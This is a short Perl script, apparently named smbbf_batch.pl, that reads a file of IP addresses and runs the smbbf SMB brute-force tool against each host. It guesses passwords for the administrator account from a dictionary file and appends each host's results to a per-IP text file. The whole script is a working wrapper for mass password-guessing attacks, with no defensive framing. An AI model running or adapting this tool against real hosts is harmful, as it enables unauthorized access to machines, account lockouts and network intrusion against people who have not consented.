########################################################
# CHECK FOR SUFFICIENT NUMBER OF COMMAND LINE ARGUMENTS
########################################################
if (!( scalar(@ARGV) == 1)) { die "Usage: smbbf\_batch.pl ip\_list\n"; }


###############################
# GATHER ARGUMENTS
###############################
$iplist = @ARGV[0];


####################################
# OPEN FILES FOR READING AND WRITING
####################################
open(IPLIST, "<$iplist") or die "Could not open group file: $iplist. $!\n";




foreach my $line (<IPLIST>) {

	chomp $line;	#get rid of newline character

	$command = 'smbbf -i ' . $line . ' -u administrator.txt -p dict.txt -w localhost -P 1 >> ' . "$line\.txt";

	print $command . "\n";

	`$command`;

}

exit;


